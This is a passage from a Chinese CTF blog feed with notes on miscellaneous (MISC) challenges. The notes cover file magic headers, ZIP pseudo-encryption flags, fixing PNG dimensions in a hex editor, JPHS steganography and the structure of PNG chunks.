src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png"></p><p>打开就可以看到啦</p><h2 id="补充exp"><a href="#补充exp" class="headerlink" title="补充exp"></a>补充exp</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727076597060-900372ab-0cf0-4eac-87cc-4278854bdba2.png"></p><p>其实直接逆序就行，但是糖了，没想到一个字节是两个十六进制表示，唐了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727076858646-3d55fa0b-1688-46e2-acab-fc6f182ad04f.png"></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">input</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;文件地址&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>input_all=<span class="hljs-built_in">input</span>.<span class="hljs-built_in">read</span>()<br>ss=input_all[::<span class="hljs-number">-1</span>]<br><span class="hljs-built_in">output</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;输出文件地址&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-built_in">output</span>.<span class="hljs-built_in">write</span>(ss)<br><span class="hljs-built_in">input</span>.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">output</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的文件头</title>
    <link href="/2025/03/22/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <url>/2025/03/22/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721533567453-70a75712-5447-4340-8142-c92303b62ae4.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721533595817-1a97c322-e2c9-4294-bcaf-28ec0734838e.png"></p><h1 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">aJPEG</span><span class="hljs-params">(jpg)</span></span>       　    文件头：FFD8FF　　　　　　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br><span class="hljs-function"><span class="hljs-title">PNG</span><span class="hljs-params">(png)</span></span>             `文件头：<span class="hljs-number">89504</span>E47　　　　　　 文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br><br><span class="hljs-function"><span class="hljs-title">GIF</span><span class="hljs-params">(gif)</span></span>              文件头：<span class="hljs-number">47494638</span>　　　  　　文件尾：<span class="hljs-number">00</span> <span class="hljs-number">3</span>B<br><br><span class="hljs-function"><span class="hljs-title">ZIP</span><span class="hljs-params">(zip)</span></span>              文件头：<span class="hljs-number">504</span>B0304　　        文件尾：<span class="hljs-number">50</span> <span class="hljs-number">4</span>B<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java">JPEG (jpg)，<br>文件头：FFD8FF　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br><span class="hljs-title function_">PNG</span> <span class="hljs-params">(png)</span>， 　　<br>文件头：<span class="hljs-number">89504E47</span>　 文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br><br>GIF (gif)， 　　<br>文件头：<span class="hljs-number">47494638</span>　 文件尾：<span class="hljs-number">00</span> 3B<br><br>ZIP <span class="hljs-title function_">Archive</span> <span class="hljs-params">(zip)</span>，<br>文件头：504B0304　　 文件尾：<span class="hljs-number">50</span> 4B<br><br><span class="hljs-title function_">TIFF</span> <span class="hljs-params">(tif)</span>， 　<br>文件头：49492A00<br><br>Windows <span class="hljs-title function_">Bitmap</span> <span class="hljs-params">(bmp)</span>， 　<br>文件头：<span class="hljs-number">424D</span><br>　　　　　　<br>CAD (dwg)， 　<br>文件头：<span class="hljs-number">41433130</span>　<br>　　　　　　　　　　　　　　　　　　　　　<br>Adobe <span class="hljs-title function_">Photoshop</span> <span class="hljs-params">(psd)</span>，<br>文件头：<span class="hljs-number">38425053</span>　<br>　　　　　　　　　　　　　　　　　　　　　<br>Rich Text <span class="hljs-title function_">Format</span> <span class="hljs-params">(rtf)</span>，<br>文件头：7B5C727466　<br>　　　　　　　　　　　　　　　　　　　<br><span class="hljs-title function_">XML</span> <span class="hljs-params">(xml)</span>，<br>文件头：3C3F786D6C　<br>　　　　　　　　　　　　　　　　　　　<br><span class="hljs-title function_">HTML</span> <span class="hljs-params">(html)</span>，<br>文件头：68746D6C3E<br><br>Email [thorough only] (eml)，<br>文件头：44656C69766572792D646174653A<br><br>Outlook <span class="hljs-title function_">Express</span> <span class="hljs-params">(dbx)</span>，<br>文件头：CFAD12FEC5FD746F<br><span class="hljs-title function_">Outlook</span> <span class="hljs-params">(pst)</span>，<br>文件头：2142444E<br><br>MS Word/Excel (xls.or.doc)，<br>文件头：D0CF11E0<br><br>MS <span class="hljs-title function_">Access</span> <span class="hljs-params">(mdb)</span>，<br>文件头：5374616E64617264204A<br><br><span class="hljs-title function_">WordPerfect</span> <span class="hljs-params">(wpd)</span>，<br>文件头：FF575043<br><br>Adobe <span class="hljs-title function_">Acrobat</span> <span class="hljs-params">(pdf)</span>，<br>文件头：255044462D312E<br><br><span class="hljs-title function_">Quicken</span> <span class="hljs-params">(qdf)</span>，<br>文件头：AC9EBD8F<br><br>Windows <span class="hljs-title function_">Password</span> <span class="hljs-params">(pwl)</span>，<br>文件头：E3828596<br><br>RAR <span class="hljs-title function_">Archive</span> <span class="hljs-params">(rar)</span>，<br>文件头：<span class="hljs-number">52617221</span><br><br>Wave (wav)， 文件头：<span class="hljs-number">57415645</span><br>AVI (avi)， 文件头：<span class="hljs-number">41564920</span><br>Real <span class="hljs-title function_">Audio</span> <span class="hljs-params">(ram)</span>， 文件头：2E7261FD<br>Real <span class="hljs-title function_">Media</span> <span class="hljs-params">(rm)</span>， 文件头：2E524D46<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>， 文件头：000001BA<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>， 文件头：000001B3<br><span class="hljs-title function_">Quicktime</span> <span class="hljs-params">(mov)</span>， 文件头：6D6F6F76<br>Windows <span class="hljs-title function_">Media</span> <span class="hljs-params">(asf)</span>， 文件头：3026B2758E66CF11<br><span class="hljs-title function_">MIDI</span> <span class="hljs-params">(mid)</span>， 文件头：4D546864<br><br>7z 文件头：<span class="hljs-number">37</span> 7A BC AF <span class="hljs-number">27</span> 1C<br></code></pre></td></tr></table></figure><p>unicode<br>![[Pasted image 20250322213754.png]]</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2025/03/22/%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>加笔记属性<br>ctrl+;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>杂项总结</title>
    <link href="/2025/03/22/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2025/03/22/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="萌新题1"><a href="#萌新题1" class="headerlink" title="萌新题1"></a>萌新题1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715076716049-7e2771f9-ca09-40ea-8603-0d6a138ae21b.png">大写字母就是flag，写个简单脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>]=&#123;<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(s);<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; s[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715076761369-298a4100-0f01-4b1d-ab66-e1d8851961f4.png"></p><h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a>ZIP伪加密解析</h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a>1、zip组成</h2><p>一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） <strong>头文件标记后2bytes</strong><br><strong>压缩源文件目录区：</strong></p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） <strong>目录文件标记后4bytes</strong><br><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记</p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a>3、全局方式位标记</h2><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br><strong>第二个数字为奇数时 –&gt;加密</strong><br><strong>第二个数字为偶数时 –&gt;未加密</strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a>4、辨别zip是真加密还是伪加密</h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a>1）无加密</h3><p>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a>2）伪加密</h3><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a>3）真加密</h3><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 !</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p><h1 id="010、winhex修改图片格式"><a href="#010、winhex修改图片格式" class="headerlink" title="010、winhex修改图片格式"></a>010、winhex修改图片格式</h1><p>从第二行开始，前四位是宽，后四位是高。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080729487-4959214d-7808-42fe-81ca-89fa501f1255.png"></p><h2 id="例题1-修改高度"><a href="#例题1-修改高度" class="headerlink" title="例题1 修改高度"></a>例题1 修改高度</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081138945-05411f70-0c96-439a-942a-b85b886b4c58.png"></p><p>把后面的的01改成02就可以增加高度，改成00就减小高度</p><p>不知道为什么前面的宽度改不了，改了会变成乱码（将01改成02）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081597458-73401b1b-a0a0-4296-ad59-46dee88c64ae.png"></p><h2 id="例题2-修改宽度"><a href="#例题2-修改宽度" class="headerlink" title="例题2 修改宽度"></a>例题2 修改宽度</h2><p>将03改成02，下调一个度，就可以看到flag啦</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715081659947-32ed728f-cd1c-4852-a3d3-040d983e483f.png"></p><h1 id="JPHS的使用"><a href="#JPHS的使用" class="headerlink" title="JPHS的使用"></a>JPHS的使用</h1><p>准备阶段：</p><p>有windows和Linux版本的，windows版有可视化界面</p><p>windows可视化界面的下载地址：</p><p>Download for Free JPHS for Windows 0.5 (scanwith.com)</p><p>GitHub下载地址：</p><p>h3xx&#x2F;jphs: jphide &amp; seek steganography tools (github.com)</p><p>使用对象：</p><p>从名字不难看出使用对象是JPEG文件（就是常见的.jpg文件）</p><p>简介：JPEG是联合图象专家组(Joint Picture Expert Group)的英文缩写，是国际标准化组织(ISO)和CCITT联合制定的静态图象的压缩编码标准，比相同图象质量的其它文件格式（静态图象）相比压缩比最高的（高压缩比）</p><p>JPHS介绍：</p><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具</p><p>JPHS包含2个功能（靠2个程序实现）：</p><p>JPHIDE：能够将信息文件加密隐藏到JPEG图像</p><p>JPSEEK：从用JPHIDE程序加密隐藏得到的JPEG图像中探测并提取到信息文件</p><p>隐藏文件：</p><p>第一步：准备文件</p><p>(test.jpg文件)+（test.txt文本）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082527848-11d91933-aacc-4aa3-96ec-5074f16bf28d.png"></p><p>第二步：（windows版本） 打开软件，点击“Open jpeg”</p><p>使用图形化操作界面的Jphs（Windows版本）——-&gt;点击“Open jpeg”打开JPEG格式图片</p><p>（我这里打开的test.jpg）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082538254-603d3adb-0722-4f01-a14c-2683ee60669c.png"></p><p>打开之后有按钮就不是灰色的了</p><p>并且还会显示JPEG文件的相关信息</p><p>(注：如果打开的不是JPEG文件会自动退出)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082552004-07a3c180-683a-4faa-bb84-290164ee0797.png"></p><p>第三步：点击“Hide”，并输入密码</p><p>点击“Hide”后输入2次相同的密码，并点击ok</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082564963-de35d817-833c-4db5-a0b5-4a70530a261e.png"></p><p>然后选择要隐藏进去的文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082579844-11749991-5770-4311-90ae-3775379d3fe9.png"></p><p>选择之后会在第二个Hidden中显示相关信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082588509-45d8fd03-66d1-4777-ac9b-c87c2b6ceed1.png"></p><p>第三步：将他们合并，并另存为</p><p>点击“Save jpeg as”将图片另存为jpeg格式然后输入自己想输入的名字.jpg</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082607181-8db66ec8-3f7b-42b2-aa51-b46859510838.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082633923-c9fa024e-d24b-4dbd-b3fb-e0e541719852.png"></p><p>the file you hid in this jpeg has caused statistically significant change and may be detectable</p><p>您在此JPEG中隐藏的文件导致统计上显着的变化，可能是可检测的</p><p>提取隐藏文件：</p><p>（注：对图片的隐写方式和密码都一无所知的时候，使用Stegdetect进行探测和破解）</p><p>我们这里知道，就可以直接提取吧<img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082644847-6542cc8d-ed0a-4663-b2c8-59ea29496671.png"></p><p>显示出信息就是打开成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082652439-5f0fecf2-3eec-4240-806e-ae1e54f70b12.png"></p><p>点击seek，再输入密码进行提取</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082685375-989806db-8a59-4ab6-9d67-867dcda5283a.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082692133-5a26e5ac-afe8-4814-bb34-cc62ab67c9f1.png"></p><p>已经提取到了（和隐藏进去的进行对比，是一样的）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082707161-b0d1b22a-6e8e-4e05-9ce1-87f5f332f5eb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715082714951-c4ba2def-dea0-4768-9bf1-65a6ac81044e.png"></p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p>获得一个jpg文件，打开然后保存为txt文件，再存为png文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083184886-15f6ff7e-feec-4719-b9de-7015742403f3.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083222397-7684b0f2-64c4-4305-8181-03fbf4363b53.png"></p><p>然后请看二维码解密部分</p><h1 id="PNG文件格式详解"><a href="#PNG文件格式详解" class="headerlink" title="PNG文件格式详解"></a>PNG文件格式详解</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>PNG是20世纪90年代中期开始开发的图像文件存储格式，其目的是替代GIF和<a href="https://so.csdn.net/so/search?q=TIFF&spm=1001.2101.3001.7020">TIFF</a>文件格式，同时增加一些GIF文件格式所不具备的特性。流式网络图形格式(Portable Network Graphic Format，PNG)名称来源于非官方的“PNG’s Not GIF”，是一种位图文件(bitmap file)存储格式，读成“ping”。PNG用来存储灰度图像时，灰度图像的深度可多到16位，存储彩色图像时，彩色图像的深度可多到48位，并且还可存储多到16位的α通道数据。PNG使用从LZ77派生的无损数据压缩算法。（说白了这就是一种方便的、适于网络传播的轻便图片文件格式）</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ol><li>使用调色板技术可支持256种颜色的彩色图像。（必须的）</li><li>流式读&#x2F;写性(streamability)：图像文件格式允许连续读出和写入图像数据。（因此适于网络传播）</li><li>逐次逼近显示(progressive display)：这种特性可使在通信链路上传输图像文件的同时就在终端上显示图像，把整个轮廓显示出来之后逐步显示图像的细节，也就是先用低分辨率显示图像，然后逐步提高它的分辨率。（类似马赛克逐渐消除的过程）</li><li>透明性(transparency)：这个性能可使图像中某些部分不显示出来，用来创建一些有特色的图像。</li><li>辅助信息(ancillary information)：这个特性可用来在图像文件中存储一些文本注释信息。（就是可以说一些废话）</li><li>独立于计算机软硬件环境。</li><li>使用无损压缩。（无损！）</li><li>可在一个文件中存储多幅图像。</li></ol><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>PNG图像格式文件由文件署名和数据块(chunk)组成。</p><h4 id="文件署名域"><a href="#文件署名域" class="headerlink" title="文件署名域"></a>文件署名域</h4><p>8字节的PNG文件署名域用来识别该文件是不是PNG文件。该域的值是：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>十进制数</strong></td><td><strong>十六进制数</strong></td></tr><tr><td>137</td><td>89</td></tr><tr><td>80</td><td>50</td></tr><tr><td>78</td><td>4e</td></tr><tr><td>71</td><td>47</td></tr><tr><td>13</td><td>0d</td></tr><tr><td>10</td><td>0a</td></tr><tr><td>26</td><td>1a</td></tr><tr><td>10</td><td>0a</td></tr></tbody></table><p>这个文件署名就是在<a href="https://blog.mythsman.com/2015/12/01/1/">《利用文件头标志判断文件类型》</a>中提到的文件头标志了，很简单。</p><h4 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a>数据块</h4><p>这里有两种类型的数据块，一种是称为关键数据块(critical chunk)，就是必须要有的块；另一种叫做辅助数据块(ancillary chunks)。</p><p>每个数据块都由下表所示的的4个域组成。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>名称</strong></td><td><strong>字节数</strong></td><td><strong>说明</strong></td></tr><tr><td>Length(长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231−1)(231−1)字节</td></tr><tr><td>Chunk Type Code(数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成</td></tr><tr><td>Chunk Data(数据块实际内容</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC(循环冗余检测</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码。</p><h4 id="关键数据块"><a href="#关键数据块" class="headerlink" title="关键数据块"></a>关键数据块</h4><p>关键数据块中的4个标准数据块是：</p><p>(1) 文件头数据块IHDR(header chunk)：</p><p>它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节，组成结构如下：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>域的名称</strong></td><td><strong>字节数</strong></td><td><strong>说明</strong></td></tr><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：索引彩色图像：1，2，4或8 ;灰度图像：1，2，4，8或16 ;真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型：0：灰度图像, 1，2，4，8或16;2：真彩色图像，8或16;3：索引彩色图像，1，2，4或84：带α通道数据的灰度图像，8或16;6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法：0：非隔行扫描;1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>(2) 调色板数据块PLTE(palette chunk)：</p><p>它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</p><p>|颜色|字节|意义|<br>|Red|1 byte||0 &#x3D; 黑色, 255 &#x3D; 红|<br>|Green|1 byte||0 &#x3D; 黑色, 255 &#x3D; 绿色|<br>|Blue|1 byte||0 &#x3D; 黑色, 255 &#x3D; 蓝色|</p><p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p><p>对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p><p>(3) 图像数据块IDAT(image data chunk)：</p><p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p>(4) 图像结束数据IEND(image trailer chunk)：</p><p>它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><p>最后，除了表示数据块开始的IHDR必须放在最前面， 表示PNG文件结束的IEND数据块放在最后面之外，其他数据块的存放顺序没有限制。</p><h4 id="辅助数据块"><a href="#辅助数据块" class="headerlink" title="辅助数据块"></a>辅助数据块</h4><p>（比较杂，不需要全部了解透）</p><p>PNG文件格式规范制定的10个辅助数据块是：</p><ol><li>背景颜色数据块bKGD(background color)。</li><li>基色和白色度数据块cHRM(primary chromaticities and white point)。所谓白色度是指当R＝G＝B＝最大值时在显示器上产生的白色度。</li><li>图像γ数据块gAMA(image gamma)。</li><li>图像直方图数据块hIST(image histogram)。</li><li>物理像素尺寸数据块pHYs(physical pixel dimensions)。</li><li>样本有效位数据块sBIT(significant bits)。</li><li>文本信息数据块tEXt(textual data)。</li><li>图像最后修改时间数据块tIME (image last-modification time)。</li><li>图像透明数据块tRNS (transparency)。</li><li>压缩文本数据块zTXt (compressed textual data)。</li></ol><h4 id="数据块摘要"><a href="#数据块摘要" class="headerlink" title="数据块摘要"></a>数据块摘要</h4><p>关键数据块、辅助数据块和专用公共数据块(special-purpose public 